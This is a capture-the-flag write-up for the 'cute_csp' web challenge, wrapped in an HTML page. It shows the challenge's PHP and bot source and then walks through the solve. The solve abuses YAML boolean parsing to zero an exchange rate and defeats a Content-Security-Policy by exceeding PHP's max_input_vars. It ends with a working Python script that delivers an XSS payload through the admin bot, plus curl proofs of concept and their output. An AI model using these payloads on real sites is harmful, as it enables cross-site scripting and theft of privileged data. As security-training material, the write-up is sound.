@@ -1,0 +1,582 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-09-07-blackhat-mea-ctf-quals-2025/cute-csp.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>cute_csp - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#cute_csp" class="nav-link">cute_csp</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="cute_csp">cute_csp</h1>
+<p>Co-authors: @ouuan @Hurrison</p>
+<pre class="highlight"><code>By Flagyard
+WEB
+So cute... so quirky...</code></pre>
+<p>The web server contains the following files, <code>index.php</code>:</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline; img-src *;");
+@print($_GET["html"] ?? show_source(__FILE__));</code></pre>
+<p>It allows us to inject any HTML, but with CSP enabled. So we cannot execute arbitrary JS.</p>
+<p>The second one is <code>report.php</code>:</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+const URL_PREFIX =  "http://localhost:5000/index.php";
+
+echo "&lt;pre&gt;";
+
+$url = $_REQUEST['url'] ?? null;
+if (isset($url) &amp;&amp; str_starts_with($url, URL_PREFIX)) {
+    $start_time = microtime(true);
+
+    $url = escapeshellarg($url);
+    system("python3 bot.py " . $url);
+
+    echo "[xssbot] total request time: " . (microtime(true) - $start_time) . " seconds";
+} else {
+    echo "[!] Please provide a URL in the format ^" . URL_PREFIX . PHP_EOL;
+}
+
+echo "&lt;/pre&gt;";</code></pre>
+<p>It executes <code>bot.py</code>, which is:</p>
+<pre class="highlight"><code class="language-python">import os
+import sys
+import asyncio
+import traceback
+from pathlib import Path
+from playwright.async_api import async_playwright
+
+BASE_URL = "http://localhost:5000"
+ADMIN_TOKEN = os.getenv("ADMIN_TOKEN")
+URL_PREFIX = "http://localhost:5000/index.php"
+
+# makeshift lockfile, not safe against deliberate race conditions
+LOCKFILE = Path("bot.lock")
+
+
+async def visit(url: str):
+    if LOCKFILE.exists():
+        print("[xssbot] ongoing visit detected, cancelling...")
+        exit(1)
+
+    if not url.startswith(URL_PREFIX):
+        print("[xssbot] invalid URL format")
+        exit(1)
+
+    try:
+        Path(LOCKFILE).touch()
+        print("[xssbot] visiting url")
+        p = await async_playwright().start()
+
+        browser = await p.chromium.launch(headless=True)
+        context = await browser.new_context()
+
+        await context.add_cookies(
+            [
+                {
+                    "name": "token",
+                    "value": ADMIN_TOKEN,
+                    "domain": "localhost",
+                    "httpOnly": True,
+                    "path": "/",
+                }
+            ]
+        )
+
+        page = await context.new_page()
+
+        await page.goto(url)
+        await page.wait_for_load_state("networkidle")
+        await page.wait_for_timeout(1_000)
+        content = await page.evaluate("() =&gt; document.documentElement.innerHTML")
+        print("-" * 32)
+        print(content)
+        print("-" * 32)
+
+    except Exception:
+        print("[xssbot] failed during visit:", traceback.format_exc())
+    finally:
+        LOCKFILE.unlink()
+        print("[xssbot] complete")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("[!] Invalid argument length")
+        exit(1)
+
+    url = sys.argv[1]
+    asyncio.run(visit(url))</code></pre>
+<p>It opens the url with cookie, so we can access protected resources in <code>admin.php</code>:</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+error_reporting(E_ALL ^ E_WARNING);
+
+const URL_PREFIX =  "http://localhost:5000/admin.php";
+const ISO3166_COUNTRY_NAMES = ['Aruba' =&gt; 'AW', 'Afghanistan' =&gt; 'AF', 'Angola' =&gt; 'AO', 'Anguilla' =&gt; 'AI', 'Åland Islands' =&gt; 'AX', 'Albania' =&gt; 'AL', 'Andorra' =&gt; 'AD', 'United Arab Emirates' =&gt; 'AE', 'Argentina' =&gt; 'AR', 'Armenia' =&gt; 'AM', 'American Samoa' =&gt; 'AS', 'Antarctica' =&gt; 'AQ', 'French Southern Territories' =&gt; 'TF', 'Antigua and Barbuda' =&gt; 'AG', 'Australia' =&gt; 'AU', 'Austria' =&gt; 'AT', 'Azerbaijan' =&gt; 'AZ', 'Burundi' =&gt; 'BI', 'Belgium' =&gt; 'BE', 'Benin' =&gt; 'BJ', 'Bonaire, Sint Eustatius and Saba' =&gt; 'BQ', 'Burkina Faso' =&gt; 'BF', 'Bangladesh' =&gt; 'BD', 'Bulgaria' =&gt; 'BG', 'Bahrain' =&gt; 'BH', 'Bahamas' =&gt; 'BS', 'Bosnia and Herzegovina' =&gt; 'BA', 'Saint Barthélemy' =&gt; 'BL', 'Belarus' =&gt; 'BY', 'Belize' =&gt; 'BZ', 'Bermuda' =&gt; 'BM', 'Bolivia, Plurinational State of' =&gt; 'BO', 'Brazil' =&gt; 'BR', 'Barbados' =&gt; 'BB', 'Brunei Darussalam' =&gt; 'BN', 'Bhutan' =&gt; 'BT', 'Bouvet Island' =&gt; 'BV', 'Botswana' =&gt; 'BW', 'Central African Republic' =&gt; 'CF', 'Canada' =&gt; 'CA', 'Cocos (Keeling) Islands' =&gt; 'CC', 'Switzerland' =&gt; 'CH', 'Chile' =&gt; 'CL', 'China' =&gt; 'CN', 'Côte d\'Ivoire' =&gt; 'CI', 'Cameroon' =&gt; 'CM', 'Congo, The Democratic Republic of the' =&gt; 'CD', 'Congo' =&gt; 'CG', 'Cook Islands' =&gt; 'CK', 'Colombia' =&gt; 'CO', 'Comoros' =&gt; 'KM', 'Cabo Verde' =&gt; 'CV', 'Costa Rica' =&gt; 'CR', 'Cuba' =&gt; 'CU', 'Curaçao' =&gt; 'CW', 'Christmas Island' =&gt; 'CX', 'Cayman Islands' =&gt; 'KY', 'Cyprus' =&gt; 'CY', 'Czechia' =&gt; 'CZ', 'Germany' =&gt; 'DE', 'Djibouti' =&gt; 'DJ', 'Dominica' =&gt; 'DM', 'Denmark' =&gt; 'DK', 'Dominican Republic' =&gt; 'DO', 'Algeria' =&gt; 'DZ', 'Ecuador' =&gt; 'EC', 'Egypt' =&gt; 'EG', 'Eritrea' =&gt; 'ER', 'Western Sahara' =&gt; 'EH', 'Spain' =&gt; 'ES', 'Estonia' =&gt; 'EE', 'Ethiopia' =&gt; 'ET', 'Finland' =&gt; 'FI', 'Fiji' =&gt; 'FJ', 'Falkland Islands (Malvinas)' =&gt; 'FK', 'France' =&gt; 'FR', 'Faroe Islands' =&gt; 'FO', 'Micronesia, Federated States of' =&gt; 'FM', 'Gabon' =&gt; 'GA', 'United Kingdom' =&gt; 'GB', 'Georgia' =&gt; 'GE', 'Guernsey' =&gt; 'GG', 'Ghana' =&gt; 'GH', 'Gibraltar' =&gt; 'GI', 'Guinea' =&gt; 'GN', 'Guadeloupe' =&gt; 'GP', 'Gambia' =&gt; 'GM', 'Guinea-Bissau' =&gt; 'GW', 'Equatorial Guinea' =&gt; 'GQ', 'Greece' =&gt; 'GR', 'Grenada' =&gt; 'GD', 'Greenland' =&gt; 'GL', 'Guatemala' =&gt; 'GT', 'French Guiana' =&gt; 'GF', 'Guam' =&gt; 'GU', 'Guyana' =&gt; 'GY', 'Hong Kong' =&gt; 'HK', 'Heard Island and McDonald Islands' =&gt; 'HM', 'Honduras' =&gt; 'HN', 'Croatia' =&gt; 'HR', 'Haiti' =&gt; 'HT', 'Hungary' =&gt; 'HU', 'Indonesia' =&gt; 'ID', 'Isle of Man' =&gt; 'IM', 'India' =&gt; 'IN', 'British Indian Ocean Territory' =&gt; 'IO', 'Ireland' =&gt; 'IE', 'Iran, Islamic Republic of' =&gt; 'IR', 'Iraq' =&gt; 'IQ', 'Iceland' =&gt; 'IS', 'Israel' =&gt; 'IL', 'Italy' =&gt; 'IT', 'Jamaica' =&gt; 'JM', 'Jersey' =&gt; 'JE', 'Jordan' =&gt; 'JO', 'Japan' =&gt; 'JP', 'Kazakhstan' =&gt; 'KZ', 'Kenya' =&gt; 'KE', 'Kyrgyzstan' =&gt; 'KG', 'Cambodia' =&gt; 'KH', 'Kiribati' =&gt; 'KI', 'Saint Kitts and Nevis' =&gt; 'KN', 'Korea, Republic of' =&gt; 'KR', 'Kuwait' =&gt; 'KW', 'Lao People\'s Democratic Republic' =&gt; 'LA', 'Lebanon' =&gt; 'LB', 'Liberia' =&gt; 'LR', 'Libya' =&gt; 'LY', 'Saint Lucia' =&gt; 'LC', 'Liechtenstein' =&gt; 'LI', 'Sri Lanka' =&gt; 'LK', 'Lesotho' =&gt; 'LS', 'Lithuania' =&gt; 'LT', 'Luxembourg' =&gt; 'LU', 'Latvia' =&gt; 'LV', 'Macao' =&gt; 'MO', 'Saint Martin (French part)' =&gt; 'MF', 'Morocco' =&gt; 'MA', 'Monaco' =&gt; 'MC', 'Moldova, Republic of' =&gt; 'MD', 'Madagascar' =&gt; 'MG', 'Maldives' =&gt; 'MV', 'Mexico' =&gt; 'MX', 'Marshall Islands' =&gt; 'MH', 'North Macedonia' =&gt; 'MK', 'Mali' =&gt; 'ML', 'Malta' =&gt; 'MT', 'Myanmar' =&gt; 'MM', 'Montenegro' =&gt; 'ME', 'Mongolia' =&gt; 'MN', 'Northern Mariana Islands' =&gt; 'MP', 'Mozambique' =&gt; 'MZ', 'Mauritania' =&gt; 'MR', 'Montserrat' =&gt; 'MS', 'Martinique' =&gt; 'MQ', 'Mauritius' =&gt; 'MU', 'Malawi' =&gt; 'MW', 'Malaysia' =&gt; 'MY', 'Mayotte' =&gt; 'YT', 'Namibia' =&gt; 'NA', 'New Caledonia' =&gt; 'NC', 'Niger' =&gt; 'NE', 'Norfolk Island' =&gt; 'NF', 'Nigeria' =&gt; 'NG', 'Nicaragua' =&gt; 'NI', 'Niue' =&gt; 'NU', 'Netherlands' =&gt; 'NL', 'Norway' =&gt; 'NO', 'Nepal' =&gt; 'NP', 'Nauru' =&gt; 'NR', 'New Zealand' =&gt; 'NZ', 'Oman' =&gt; 'OM', 'Pakistan' =&gt; 'PK', 'Panama' =&gt; 'PA', 'Pitcairn' =&gt; 'PN', 'Peru' =&gt; 'PE', 'Philippines' =&gt; 'PH', 'Palau' =&gt; 'PW', 'Papua New Guinea' =&gt; 'PG', 'Poland' =&gt; 'PL', 'Puerto Rico' =&gt; 'PR', 'Korea, Democratic People\'s Republic of' =&gt; 'KP', 'Portugal' =&gt; 'PT', 'Paraguay' =&gt; 'PY', 'Palestine, State of' =&gt; 'PS', 'French Polynesia' =&gt; 'PF', 'Qatar' =&gt; 'QA', 'Réunion' =&gt; 'RE', 'Romania' =&gt; 'RO', 'Russian Federation' =&gt; 'RU', 'Rwanda' =&gt; 'RW', 'Saudi Arabia' =&gt; 'SA', 'Sudan' =&gt; 'SD', 'Senegal' =&gt; 'SN', 'Singapore' =&gt; 'SG', 'South Georgia and the South Sandwich Islands' =&gt; 'GS', 'Saint Helena, Ascension and Tristan da Cunha' =&gt; 'SH', 'Svalbard and Jan Mayen' =&gt; 'SJ', 'Solomon Islands' =&gt; 'SB', 'Sierra Leone' =&gt; 'SL', 'El Salvador' =&gt; 'SV', 'San Marino' =&gt; 'SM', 'Somalia' =&gt; 'SO', 'Saint Pierre and Miquelon' =&gt; 'PM', 'Serbia' =&gt; 'RS', 'South Sudan' =&gt; 'SS', 'Sao Tome and Principe' =&gt; 'ST', 'Suriname' =&gt; 'SR', 'Slovakia' =&gt; 'SK', 'Slovenia' =&gt; 'SI', 'Sweden' =&gt; 'SE', 'Eswatini' =&gt; 'SZ', 'Sint Maarten (Dutch part)' =&gt; 'SX', 'Seychelles' =&gt; 'SC', 'Syrian Arab Republic' =&gt; 'SY', 'Turks and Caicos Islands' =&gt; 'TC', 'Chad' =&gt; 'TD', 'Togo' =&gt; 'TG', 'Thailand' =&gt; 'TH', 'Tajikistan' =&gt; 'TJ', 'Tokelau' =&gt; 'TK', 'Turkmenistan' =&gt; 'TM', 'Timor-Leste' =&gt; 'TL', 'Tonga' =&gt; 'TO', 'Trinidad and Tobago' =&gt; 'TT', 'Tunisia' =&gt; 'TN', 'Türkiye' =&gt; 'TR', 'Tuvalu' =&gt; 'TV', 'Taiwan, Province of China' =&gt; 'TW', 'Tanzania, United Republic of' =&gt; 'TZ', 'Uganda' =&gt; 'UG', 'Ukraine' =&gt; 'UA', 'United States Minor Outlying Islands' =&gt; 'UM', 'Uruguay' =&gt; 'UY', 'United States' =&gt; 'US', 'Uzbekistan' =&gt; 'UZ', 'Holy See (Vatican City State)' =&gt; 'VA', 'Saint Vincent and the Grenadines' =&gt; 'VC', 'Venezuela, Bolivarian Republic of' =&gt; 'VE', 'Virgin Islands, British' =&gt; 'VG', 'Virgin Islands, U.S.' =&gt; 'VI', 'Viet Nam' =&gt; 'VN', 'Vanuatu' =&gt; 'VU', 'Wallis and Futuna' =&gt; 'WF', 'Samoa' =&gt; 'WS', 'Yemen' =&gt; 'YE', 'South Africa' =&gt; 'ZA', 'Zambia' =&gt; 'ZM', 'Zimbabwe' =&gt; 'ZW', 'FLAG' =&gt; 'FL'];
+$ADMIN_TOKEN = getenv('ADMIN_TOKEN');
+
+$admin_token = $_COOKIE['token'] ?? null;
+
+if ($_SERVER['REMOTE_ADDR'] &lt;&gt; '127.0.0.1' &amp;&amp; (!isset($admin_token) || strcmp($admin_token, $ADMIN_TOKEN) &lt;&gt; 0)) {
+    echo "[!] Oops! Invalid admin token";
+    die(1);
+}
+
+switch ($_SERVER['REQUEST_METHOD']) {
+    case 'GET':
+        simulate_transactions();
+        break;
+
+    case 'POST':
+        process_transactions();
+        break;
+}
+
+/**
+ *  we allow transaction simulation, just in case we do not wanna go ahead with that
+ *  specific transaction processing
+ */
+function simulate_transactions()
+{
+    header('Content-Type: text/plain');
+
+    if (!key_exists('transactions', $_GET) || !is_array($_GET['transactions'])) {
+        echo "[!] Please provide the transactions array you wish to simulate." . PHP_EOL;
+        return;
+    }
+
+    $buy = true;
+    foreach ($_GET['transactions'] as $key =&gt; $tx) {
+        if (!isset($tx['amount']) || !isset($tx['country'])) {
+            echo "[!] Missing amount or country in transaction #$key" . PHP_EOL;
+            return;
+        }
+
+        $amount = $tx['amount'];
+        $country = $tx['country'];
+
+        // validate the two fields
+        if (!is_numeric($amount) || !array_key_exists($country, ISO3166_COUNTRY_NAMES)) {
+            echo "[!] Invalid transaction amount or country in transaction #$key" . PHP_EOL;
+            return;
+        }
+
+        $currency = ISO3166_COUNTRY_NAMES[$country];
+        printf("- amount: %d\n  currency: %s\n  op: %s\n", intval($amount), $currency, $buy ? "BUY" : "SELL");
+
+        // you cant keep buying, gotta switch it up, its no free economy in here...
+        $buy = !$buy;
+    }
+}
+
+/**
+ *  we batch process all of our transactions based on simulation results; this 
+ *  guarantees safety against race conditions and other wild stuff.
+ */
+function process_transactions()
+{
+    $url = $_REQUEST['url'] ?? null;
+
+    if (!isset($url) || !str_starts_with($url, URL_PREFIX)) {
+        echo "[!] Invalid simulation url: " . $url;
+        return;
+    }
+
+    // TODO: We really need to support real exchange rates some day, it does not seem fair in its current
+    // format. on the bright side, at least we are treating everybody equally :)
+    $exchange_rates = [];
+    foreach (ISO3166_COUNTRY_NAMES as $country =&gt; $currency) {
+        $exchange_rates[$currency] = 1;
+    }
+
+    $exchange_rates['FL'] = 1_000_000;
+    $balance = 1;
+
+    echo "&lt;pre&gt;" . PHP_EOL;
+
+    echo '11111' . PHP_EOL;
+    echo "fgc" . file_get_contents($url) . PHP_EOL;
+    echo '22222' . PHP_EOL;
+    echo "url" . $url . PHP_EOL;
+    echo '33333' . PHP_EOL;
+    $txs = @yaml_parse_url($url);
+    if ($txs === false || !is_array($txs)) {
+        echo "[!] Failed to parse transactions from url";
+        return;
+    }
+
+    $currency_inventory = [];
+
+    echo "Transactions Processing Sheet\n--------------------------" . PHP_EOL;
+    foreach ($txs as $i =&gt; $tx) {
+        if (!is_array($tx)) {
+            echo "[!] Transaction #{$i} must be an object";
+            return;
+        }
+
+        if (!array_key_exists('amount', $tx) || !array_key_exists('currency', $tx) || !array_key_exists('op', $tx)) {
+            echo "[!] Transaction #{$i} must include 'amount' and 'currency'";
+            return;
+        }
+
+        $op = $tx['op'];
+        $amount = $tx['amount'];
+        $currency = $tx['currency'];
+
+        if (!is_int($amount) || $amount &lt;= 0) {
+            echo "[!] Transaction #{$i} amount must be a positive integer";
+            return;
+        }
+
+        if ($op &lt;&gt; 'BUY' &amp;&amp; $op &lt;&gt; 'SELL') {
+            echo "[!] Transaction #{$i} op must be either BUY or SELL";
+            return;
+        }
+
+        if (!isset($currency_inventory[$currency])) {
+            $currency_inventory[$currency] = 0;
+        }
+
+        $currency_rate = $exchange_rates[$currency];
+        $value = $amount * intval($currency_rate);
+
+        if ($op == 'BUY') {
+            // do we have enough balance to cover this buy?
+            if ($balance - $value &gt;= 0) {
+                $balance -= $value;
+                $currency_inventory[$currency] += $amount;
+            } else {
+                echo "[!] Transaction #{$i} insufficient balance to BUY {$amount} {$currency}. "
+                    . "Cost: {$value}, Balance: {$balance}";
+                return;
+            }
+        } elseif ($op == 'SELL') {
+            // do we have enough currency to sell?
+            if ($currency_inventory[$currency] &gt;= $amount) {
+                $balance += $value ? $value : $amount;
+                $currency_inventory[$currency] -= $amount;
+            } else {
+                echo "[!] Transaction #{$i} cannot SELL {$amount} {$currency}; "
+                    . "inventory is {$currency_inventory[$currency]}";
+                return;
+            }
+        } else {
+            echo "[!] Transaction #{$i} op must be either BUY or SELL";
+            return;
+        }
+
+        printf("%s %2dx %s (Rate: %.1f) = %3d\n", $op == 'BUY' ? '-' : '+', $amount, $currency, $currency_rate, $value);
+    }
+
+    foreach ($currency_inventory as $cur =&gt; $qty) {
+        printf("Final Inventory %-5s : %s\n", $cur, $cur === 'FL' ? getenv('DYN_FLAG') : $qty);
+    }
+
+    echo PHP_EOL . "&lt;/pre&gt;";
+}</code></pre>
+<p>So the first part is, how to let <code>admin.php</code> prints flag? @ouuan gives the answer:</p>
+<ol>
+<li>Utilize a feature of yaml that interprets <code>NO</code> as boolean type, instead of country code of <code>Norway</code></li>
+<li>So that the currency rate is 0, we can trade for any amount of <code>NO</code> currency</li>
+<li>Finally buy the flag</li>
+</ol>
+<p>Transactions:</p>
+<pre class="highlight"><code class="language-yaml">- amount: 1000000
+  currency: NO
+  op: BUY
+- amount: 1000000
+  currency: NO
+  op: SELL
+- amount: 1
+  currency: FL
+  op: BUY</code></pre>
+<p>Proof of concept:</p>
+<pre class="highlight"><code class="language-shell">$ curl --globoff -X POST "http://172.17.0.3:5000/admin.php?url=http://localhost:5000/admin.php?transactions[0][amount]=1000000%26transactions[0][country]=Norway%26transactions[1][amount]=1000000%26transactions[1][country]=Norway%26transactions[2][amount]=1%26transactions[2][country]=FLAG" -H "Cookie: token=44d1e1e870346643aca25763ce549552"
+&lt;pre&gt;
+11111
+fgc- amount: 1000000
+  currency: NO
+  op: BUY
+- amount: 1000000
+  currency: NO
+  op: SELL
+- amount: 1
+  currency: FL
+  op: BUY
+
+22222
+urlhttp://localhost:5000/admin.php?transactions[0][amount]=1000000&amp;transactions[0][country]=Norway&amp;transactions[1][amount]=1000000&amp;transactions[1][country]=Norway&amp;transactions[2][amount]=1&amp;transactions[2][country]=FLAG
+33333
+Transactions Processing Sheet
+--------------------------
+- 1000000x  (Rate: 0.0) =   0
++ 1000000x  (Rate: 0.0) =   0
+-  1x FL (Rate: 1000000.0) = 1000000
+Final Inventory 0     : 0
+Final Inventory FL    : flag
+
+&lt;/pre&gt;</code></pre>
+<p>Since we don't have the cookie, we need to use the bot to do the POST in the server. However, the content security policy forbids javascript execution. How can we bypass it?</p>
+<p>The first possible solution is from @ouuan:</p>
+<ul>
+<li>If <code>index.php</code> cannot provide us the html that can run javascript</li>
+<li>We can use <code>report.php</code> to generate html for us!</li>
+<li>However, <code>report.php</code> runs <code>bot.py</code>, which cannot be run simultaneously via:</li>
+</ul>
+<pre class="highlight"><code class="language-python"># makeshift lockfile, not safe against deliberate race conditions
+LOCKFILE = Path("bot.lock")</code></pre>
+<p>But it is possible for race condition:</p>
+<ol>
+<li>Run two bots in parallel, so that the lock file is created twice</li>
+<li>The first bot stops, and removes the lock file</li>
+<li>Use the second bot to send request to <code>report.php</code> to get the html with JS enabled</li>
+</ol>
+<p>@ouuan successfully attacks both locally and remotely.</p>
+<p>Another way to bypass CSP, is suggested by @Hurrison: when the HTTP request contains more than 1000 queries, it will fail:</p>
+<pre class="highlight"><code class="language-html">&lt;b&gt;Warning&lt;/b&gt;:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br&gt;
+&lt;br&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br&gt;</code></pre>
+<p>Therefore the CSP header is missing. But, the html is still printed! We can bypass CSP limitation by simply adding many query parameters:</p>
+<pre class="highlight"><code class="language-python">import requests
+from urllib.parse import quote
+
+target = 'http://cmvkynvk.playat.flagyard.com'
+#target = 'http://172.17.0.3:5000'
+
+xss = quote("""
+&lt;script&gt;
+(async () =&gt; {
+    const res = await fetch('http://localhost:5000/admin.php?url=http://localhost:5000/admin.php?transactions[0][amount]=1000000%26transactions[0][country]=Norway%26transactions[1][amount]=1000000%26transactions[1][country]=Norway%26transactions[2][amount]=1%26transactions[2][country]=FLAG', { method: 'POST', headers: {'Content-Type': 'text/plain'}});
+    const data = await res.text();
+    document.documentElement.innerHTML += data;
+})();
+&lt;/script&gt;
+""".strip())
+
+exp = f'http://localhost:5000/index.php/?html={xss}&amp;' + '&amp;'.join([f'{i}=0' for i in range(1001)])
+
+url = f'{target}/report.php'
+data = {
+    'url': exp
+}
+r = requests.post(url, data=data)
+print(r.text)</code></pre>
+<p>Output:</p>
+<pre class="highlight"><code class="language-html">&lt;pre&gt;[xssbot] visiting url
+--------------------------------
+&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br&gt;
+&lt;br&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br&gt;
+&lt;script&gt;
+(async () =&gt; {
+    const res = await fetch('http://localhost:5000/admin.php?url=http://localhost:5000/admin.php?transactions[0][amount]=1000000%26transactions[0][country]=Norway%26transactions[1][amount]=1000000%26transactions[1][country]=Norway%26transactions[2][amount]=1%26transactions[2][country]=FLAG', { method: 'POST', headers: {'Content-Type': 'text/plain'}});
+    const data = await res.text();
+    document.documentElement.innerHTML += data;
+})();
+&lt;/script&gt;&lt;pre&gt;Transactions Processing Sheet
+--------------------------
+- 1000000x  (Rate: 0.0) =   0
++ 1000000x  (Rate: 0.0) =   0
+-  1x FL (Rate: 1000000.0) = 1000000
+Final Inventory 0     : 0
+Final Inventory FL    : BHFlagY{423f5511a87131df7a1061d09c40b7ec}
+
+&lt;/pre&gt;&lt;/body&gt;
+--------------------------------
+[xssbot] complete
+[xssbot] total request time: 2.4307129383087 seconds&lt;/pre&gt;</code></pre>
+<p>The flag is <code>BHFlagY{423f5511a87131df7a1061d09c40b7ec}</code>.</p></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
